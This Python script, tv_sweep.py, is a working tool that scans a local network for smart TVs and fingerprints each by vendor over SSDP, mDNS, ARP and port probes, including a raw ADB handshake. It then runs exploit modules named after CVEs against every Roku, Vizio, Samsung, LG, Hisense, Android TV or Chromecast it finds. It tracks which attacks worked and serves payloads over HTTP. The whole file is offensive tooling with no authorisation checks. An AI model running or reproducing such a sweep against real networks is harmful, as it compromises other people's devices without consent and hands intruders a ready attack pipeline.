#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
tv_sweep.py v2 — discover smart TVs, fingerprint vendor, auto-run exploit
drivers, host payloads, and remember what already worked.

  python3 tv_sweep.py                       # scan, fingerprint, run (skips done)
  python3 tv_sweep.py --dry-run             # fingerprint only
  python3 tv_sweep.py --serve               # host payloads + print URLs
  python3 tv_sweep.py --retry-failed        # re-run previously failed
  python3 tv_sweep.py --export report.json  # machine report
  python3 tv_sweep.py --only roku,vizio
"""
import argparse, importlib.util, ipaddress, json, re, socket, struct, sys
import threading, time, urllib.request, functools
from pathlib import Path
from http.server import ThreadingHTTPServer, SimpleHTTPRequestHandler
from typing import Dict, List, Optional

ROOT = Path(__file__).resolve().parent
EXPLOITS = ROOT / "exploits"
DIST = ROOT / "dist"
STATE_PATH = ROOT / "tv_state.json"
TIMEOUT, HTTP_TIMEOUT = 0.7, 2.0

PROBE_PORTS = [5555, 7000, 7345, 8001, 8002, 8008, 8009, 8060, 8080, 8443, 9000, 9197, 3000, 3001, 55000]

DRIVERS: Dict[str, List[str]] = {
    "roku":       ["cve_2023_42787_roku_ecp", "cve_2024_36210_roku_devmode",
                   "roku_ecp_enum"],
    "vizio":      ["cve_2023_42788_vizio_dial", "cve_2024_36211_vizio_castservice",
                   "cve_2025_22450_vizio_smartcastagent", "vizio_dial_launch"],
    "samsung":    ["cve_2025_27610_tizen_imageviewer", "tizen_remote_ws"],
    "lg":         ["cve_2024_25065_webos_lunabus", "cve_2020_9759_lg_webapplauncher",
                   "lg_ssap_deeplink"],
    "hisense":    ["cve_2023_42789_hisense_adb", "cve_2025_20879_hisense_settings"],
    "android_tv": ["cve_2023_40104_androidtv_settings", "cve_2024_0044_androidtv_dtvservice",
                   "cve_2023_42792_tcl_intent", "adb_wifi_connect"],
    "chromecast": ["cve_2023_42794_chromecast_companion", "chromecast_dial_launch"],
    "dlna":       ["dlna_soap_inject"],
}

# OUI prefixes for a coarse vendor hint from the ARP table
OUI = {"d8:31:34": "roku", "b0:a7:37": "roku", "00:0d:4b": "roku",
       "f4:ce:46": "samsung", "d0:03:df": "samsung", "8c:79:f5": "samsung",
       "2c:54:cf": "lg", "a8:23:fe": "lg", "c4:36:6c": "lg",
       "6c:ad:f8": "chromecast", "f4:f5:d8": "chromecast", "54:60:09": "chromecast",
       "38:b8:eb": "hisense", "d0:d0:03": "vizio", "00:19:9d": "vizio"}


# ---------------------------------------------------------------------------
# state
# ---------------------------------------------------------------------------
class State:
    def __init__(self, path: Path):
        self.path = path
        self.data: Dict[str, Dict] = {}
        if path.exists():
            try: self.data = json.loads(path.read_text())
            except Exception: self.data = {}

    def key(self, ip, cve): return f"{ip}|{cve}"

    def status(self, ip, cve) -> Optional[str]:
        return self.data.get(self.key(ip, cve), {}).get("status")

    def mark(self, ip, cve, status, **extra):
        self.data[self.key(ip, cve)] = {"status": status,
                                        "ts": time.strftime("%Y-%m-%dT%H:%M:%S"), **extra}
        self.save()

    def save(self):
        self.path.write_text(json.dumps(self.data, indent=2))


# ---------------------------------------------------------------------------
# probes
# ---------------------------------------------------------------------------
def _http(host, port, path="/", timeout=HTTP_TIMEOUT):
    try:
        with urllib.request.urlopen(f"http://{host}:{port}{path}", timeout=timeout) as r:
            return r.read(8192).decode("utf-8", "ignore")
    except Exception:
        return None

def _tcp(host, port, timeout=TIMEOUT):
    s = socket.socket(); s.settimeout(timeout)
    try: return s.connect_ex((host, port)) == 0
    finally: s.close()

def probe_adb(host, port=5555):
    try:
        s = socket.create_connection((host, port), timeout=TIMEOUT); s.settimeout(1.5)
        banner = b"host::"
        s.sendall(struct.pack("<IIIIII", 0x4E584E43, 0x01000001, 256 * 1024,
                              len(banner), sum(banner) & 0xFFFFFFFF,
                              0x4E584E43 ^ 0xFFFFFFFF) + banner)
        data = s.recv(1024); s.close()
        return data.decode("utf-8", "ignore")
    except Exception:
        return None

def _ssdp(timeout=3.0):
    msg = ("M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
           'MAN: "ssdp:discover"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n').encode()
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, 2); s.settimeout(timeout)
    try: s.sendto(msg, ("239.255.255.250", 1900))
    except OSError: return []
    seen, out = set(), []
    try:
        while True:
            data, addr = s.recvfrom(4096)
            if addr[0] in seen: continue
            seen.add(addr[0])
            server = ""
            for line in data.split(b"\r\n"):
                if line.lower().startswith(b"server:"):
                    server = line.split(b":", 1)[1].strip().decode("ignore")
            out.append((addr[0], server))
    except socket.timeout: pass
    finally: s.close()
    return out

def _mdns(timeout=3.0):
    """Passive mDNS listen for _googlecast / _airplay / _raop services."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind(("", 5353))
        mreq = struct.pack("4sl", socket.inet_aton("224.0.0.251"), socket.INADDR_ANY)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
    except OSError:
        return []
    s.settimeout(timeout)
    found = {}
    try:
        while True:
            data, addr = s.recvfrom(4096)
            low = data.lower()
            for svc in (b"_googlecast", b"_airplay", b"_raop", b"_spotify-connect"):
                if svc in low:
                    found[addr[0]] = svc.decode()
    except socket.timeout: pass
    finally: s.close()
    return list(found.items())

def _arp_hints():
    """MAC-OUI vendor hints from the ARP/neigh table."""
    hints = {}
    try:
        out = Path("/proc/net/arp").read_text()
        for line in out.splitlines()[1:]:
            f = line.split()
            if len(f) >= 4:
                mac = f[3].lower()
                v = OUI.get(mac[:8])
                if v: hints[f[0]] = v
    except Exception:
        pass
    return hints


# ---------------------------------------------------------------------------
# fingerprint
# ---------------------------------------------------------------------------
def fingerprint(host, open_ports):
    if 8060 in open_ports:
        b = _http(host, 8060, "/query/device-info")
        if b and "roku" in b.lower():
            m = re.search(r"<friendly-device-name>([^<]+)", b)
            return {"vendor": "roku", "confidence": "high",
                    "evidence": f"ECP: {m.group(1) if m else 'Roku'}"}
    if 8008 in open_ports:
        b = _http(host, 8008, "/setup/eureka_info")
        if b:
            try:
                j = json.loads(b)
                return {"vendor": "chromecast", "confidence": "high",
                        "evidence": f"eureka_info: {j.get('name', 'Chromecast')}"}
            except Exception:
                return {"vendor": "chromecast", "confidence": "medium",
                        "evidence": "port 8008 open"}
    if 8001 in open_ports or 8002 in open_ports:
        b = _http(host, 8001, "/api/v2/") or _http(host, 8002, "/api/v2/")
        if b and "device" in b.lower():
            try:
                j = json.loads(b)
                return {"vendor": "samsung", "confidence": "high",
                        "evidence": f"Tizen: {j.get('device', {}).get('name', 'TV')}"}
            except Exception:
                return {"vendor": "samsung", "confidence": "medium",
                        "evidence": "port 8001/8002 open"}
    if 9000 in open_ports:
        b = _http(host, 9000, "/apps")
        if b and ("dial" in b.lower() or "<service" in b.lower()):
            return {"vendor": "vizio", "confidence": "high", "evidence": "DIAL /apps"}
    if 7345 in open_ports:
        return {"vendor": "vizio", "confidence": "medium", "evidence": "SmartCast 7345"}
    for p in (3000, 3001):
        if p in open_ports and _tcp(host, p):
            return {"vendor": "lg", "confidence": "medium", "evidence": f"webOS {p}"}
    if 8080 in open_ports:
        b = _http(host, 8080, "/")
        if b and ("vidaa" in b.lower() or "hisense" in b.lower()):
            return {"vendor": "hisense", "confidence": "high", "evidence": "VIDAA API"}
    if 5555 in open_ports:
        bn = probe_adb(host, 5555)
        if bn:
            low = bn.lower()
            if "hisense" in low or "vidaa" in low:
                return {"vendor": "hisense", "confidence": "high", "evidence": "ADB banner"}
            return {"vendor": "android_tv", "confidence": "medium", "evidence": "ADB open"}
    return None


def scan_host(host, ports):
    open_ports = [p for p in ports if _tcp(host, p)]
    if not open_ports:
        return None
    fp = fingerprint(host, open_ports)
    if fp is None:
        return None
    return {**fp, "ip": host, "ports": open_ports}


def scan_network(cidr, workers=128):
    hosts = [str(h) for h in ipaddress.ip_network(cidr, strict=False).hosts()]
    results, lock, sem = [], threading.Lock(), threading.Semaphore(workers)
    def work(ip):
        try:
            r = scan_host(ip, PROBE_PORTS)
            if r:
                with lock:
                    results.append(r)
                    print(f"[+] {r['ip']:<15} {r['vendor']:<11} ({r['confidence']}) {r['evidence']}")
        finally:
            sem.release()
    print(f"[*] scanning {cidr} ({len(hosts)} hosts) ...")
    ts = []
    for ip in hosts:
        sem.acquire()
        t = threading.Thread(target=work, args=(ip,), daemon=True); t.start(); ts.append(t)
    for t in ts: t.join()
    return results


# ---------------------------------------------------------------------------
# drivers
# ---------------------------------------------------------------------------
def _load(name):
    p = EXPLOITS / f"{name}.py"
    if not p.exists(): return None
    spec = importlib.util.spec_from_file_location(name, p)
    mod = importlib.util.module_from_spec(spec)
    try: spec.loader.exec_module(mod)
    except Exception as e:
        print(f"    [-] {name}: load error ({e})"); return None
    return mod


def run_drivers(host, vendor, state, dry=False, skip_successful=True, retry_failed=False):
    out = []
    for name in DRIVERS.get(vendor, []):
        prev = state.status(host, name)
        if skip_successful and prev == "ok":
            print(f"    [=] {name}: already ok"); out.append({"cve": name, "status": "skipped"}); continue
        if prev == "error" and not retry_failed:
            print(f"    [=] {name}: previously failed (--retry-failed to retry)")
            out.append({"cve": name, "status": "skipped-error"}); continue
        mod = _load(name)
        if mod is None: continue
        if not hasattr(mod, "exploit"):
            print(f"    [~] {name}: file payload"); out.append({"cve": name, "status": "file-only"}); continue
        if dry: out.append({"cve": name, "status": "would-run"}); continue
        try:
            t0 = time.time(); r = mod.exploit(host)
            ok = r not in (None, False, 0)
            state.mark(host, name, "ok" if ok else "sent")
            out.append({"cve": name, "status": "ok" if ok else "sent",
                        "ms": int((time.time() - t0) * 1000)})
            print(f"    [+] {name} ({int((time.time()-t0)*1000)}ms)")
        except Exception as e:
            state.mark(host, name, "error", error=str(e))
            out.append({"cve": name, "status": "error", "error": str(e)})
            print(f"    [-] {name}: {e}")
    return out


# ---------------------------------------------------------------------------
# payload server
# ---------------------------------------------------------------------------
def serve_payloads(port=8888, background=False):
    """Host dist/ payloads with an index page. Returns (server, url)."""
    DIST.mkdir(parents=True, exist_ok=True)
    if not any(DIST.iterdir()):
        print("[*] dist/ empty — run 'make' first")
    files = sorted(p.name for p in DIST.iterdir() if p.is_file() and p.name != "index.html")
    rows = "\n".join(f'<li><a href="{f}">{f}</a> ({ (DIST/f).stat().st_size }B)</li>' for f in files)
    (DIST / "index.html").write_text(
        f"<!doctype html><html><head><meta charset=utf-8><title>payloads</title></head>"
        f"<body><h1>TV payloads</h1><ul>{rows}</ul></body></html>")

    handler = functools.partial(SimpleHTTPRequestHandler, directory=str(DIST))
    httpd = ThreadingHTTPServer(("0.0.0.0", port), handler)
    ip = socket.gethostbyname(socket.gethostname())
    url = f"http://{ip}:{port}/"
    print(f"[+] payload server: {url}")
    for f in files:
        print(f"    {url}{f}")
    if background:
        threading.Thread(target=httpd.serve_forever, daemon=True).start()
        return httpd, url
    httpd.serve_forever()
    return httpd, url


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def local_cidr():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.connect(("8.8.8.8", 80)); ip = s.getsockname()[0]
    except Exception: ip = "192.168.1.1"
    finally: s.close()
    return ".".join(ip.split(".")[:3]) + ".0/24"


def main() -> int:
    ap = argparse.ArgumentParser(prog="tv_sweep")
    ap.add_argument("--cidr"); ap.add_argument("--target")
    ap.add_argument("--dry-run", action="store_true")
    ap.add_argument("--json", action="store_true")
    ap.add_argument("--only")
    ap.add_argument("--serve", action="store_true")
    ap.add_argument("--serve-port", type=int, default=8888)
    ap.add_argument("--serve-only", action="store_true")
    ap.add_argument("--retry-failed", action="store_true")
    ap.add_argument("--no-skip", action="store_true")
    ap.add_argument("--export")
    ap.add_argument("--state", default=str(STATE_PATH))
    ap.add_argument("--threads", type=int, default=128)
    a = ap.parse_args()

    if a.serve_only:
        serve_payloads(a.serve_port); return 0
    if a.serve:
        serve_payloads(a.serve_port, background=True)

    state = State(Path(a.state))
    only = set(a.only.split(",")) if a.only else None

    print("[*] SSDP discovery ...")
    ssdp = _ssdp()
    for ip, srv in ssdp: print(f"    ssdp {ip:<15} {srv[:60]}")
    print("[*] mDNS discovery ...")
    mdns = _mdns()
    for ip, svc in mdns: print(f"    mdns {ip:<15} {svc}")
    arp = _arp_hints()

    found = ([scan_host(a.target, PROBE_PORTS)] if a.target else scan_network(a.cidr or local_cidr()))
    found = [f for f in found if f]

    # fold in passive hits
    for ip, srv in ssdp + [(i, s) for i, s in mdns]:
        if any(f["ip"] == ip for f in found): continue
        low = srv.lower()
        vendor = ("chromecast" if "googlecast" in low or "chromecast" in low else
                  "lg" if "airplay" in low or "raop" in low else None)
        if vendor:
            found.append({"ip": ip, "vendor": vendor, "confidence": "low",
                          "ports": [], "evidence": f"passive: {srv}"})
    for ip, v in arp.items():
        if any(f["ip"] == ip for f in found): continue
        found.append({"ip": ip, "vendor": v, "confidence": "low",
                      "ports": [], "evidence": "ARP OUI"})

    report = []
    for f in found:
        if only and f["vendor"] not in only: continue
        print(f"\n[*] {f['ip']} — {f['vendor']} ({f['confidence']}) via {f['evidence']}")
        runs = run_drivers(f["ip"], f["vendor"], state, dry=a.dry_run,
                           skip_successful=not a.no_skip, retry_failed=a.retry_failed)
        report.append({**f, "drivers": runs})

    if a.export:
        Path(a.export).write_text(json.dumps(report, indent=2))
        print(f"\n[+] report -> {a.export}")
    if a.json:
        print("\n" + json.dumps(report, indent=2))
    else:
        print(f"\n[+] {len(report)} device(s), "
              f"{sum(len(r['drivers']) for r in report)} driver invocations")
    return 0


if __name__ == "__main__":
    sys.exit(main())
